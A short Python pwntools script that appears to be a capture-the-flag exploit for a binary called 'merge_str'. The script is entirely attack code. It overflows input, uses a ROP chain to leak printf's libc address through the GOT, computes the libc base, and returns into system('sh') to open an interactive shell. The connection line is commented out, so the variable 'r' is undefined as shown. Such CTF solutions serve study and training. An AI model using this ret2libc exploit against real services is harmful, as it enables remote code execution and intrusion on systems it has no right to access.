#!/usr/bin/python

from pwn import *
import hashlib
#r=remote("pwn06.grandprix.whitehatvn.com",23506)
bin = ELF("merge_str")
e = ELF("libc.so.6")
rop = ROP(bin)
r.recvuntil("1 : ")
r.sendline("A"*50)
r.recvuntil("2 : ")
r.sendline("B"*50)
r.recv()
r.sendline("Y")
r.recvuntil(":")
r.sendline("198")
r.recvuntil(":")
payload = "C"*14
payload += p32(bin.plt['printf'])
payload += p32(0x8048C7F) #main
payload += p32(bin.got['printf'])
r.sendline(payload)
addr_printf = u32(r.recv(4))
log.info('addr printf :0x%x'%addr_printf)
base = addr_printf - e.symbols['printf']
r.recvuntil('1 : ')
r.sendline("C"*50)
r.recvuntil('2 : ')
r.sendline("D"*50)
r.recv()
r.sendline("Y")
r.recvuntil(":")
r.sendline("198")
r.recv()
#pause()
payload = "A"*14
payload += p32(base+e.symbols['system'])
payload += p32(base+e.search("sh\x00").next())
payload += p32(base+e.search("sh\x00").next())

r.sendline(payload)
r.interactive()

